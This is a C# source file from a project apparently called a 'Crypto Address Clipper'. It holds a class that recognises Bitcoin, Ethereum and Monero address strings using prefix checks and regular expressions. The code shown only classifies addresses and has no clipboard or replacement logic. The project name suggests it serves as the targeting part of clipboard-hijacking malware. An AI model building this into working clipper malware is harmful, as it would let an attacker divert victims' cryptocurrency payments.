using System;
using System.Collections.Generic;
using System.Linq;
using System.Security;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Reflection.Metadata.Ecma335;
using static System.Net.Mime.MediaTypeNames;

namespace Crypto_Address_Clipper
{
    class Address
    {
        public enum CryptoTypes { BTC, ETH, XMR, NONE}
        
        public static CryptoTypes ValidateCryptoType(string address)
        {
            if (BtcMatch(address))
            {
                return CryptoTypes.BTC;
            }
            else if (EthMatch(address))
            {
                return CryptoTypes.ETH;
            }
            else if (XmrMatch(address))
            {
                return CryptoTypes.XMR;
            }
            else
            {
                return CryptoTypes.NONE;
            }
        }

        public static bool XmrMatch(string address) => Regex.IsMatch(address, Regexes.Xmr);
        public static bool EthMatch(string address) => Regex.IsMatch(address, Regexes.Eth);
        public static bool BtcMatch(string address)
        {
            if (address.Length >= 26 && address.Length <= 62 && (address.StartsWith("1") || address.StartsWith("3") || address.StartsWith("bc1")))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        class Regexes
        {
            public static string Eth = "^0x[a-fA-F0-9]{40}$";
            public static string Xmr = "4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$";
        }
    }
}
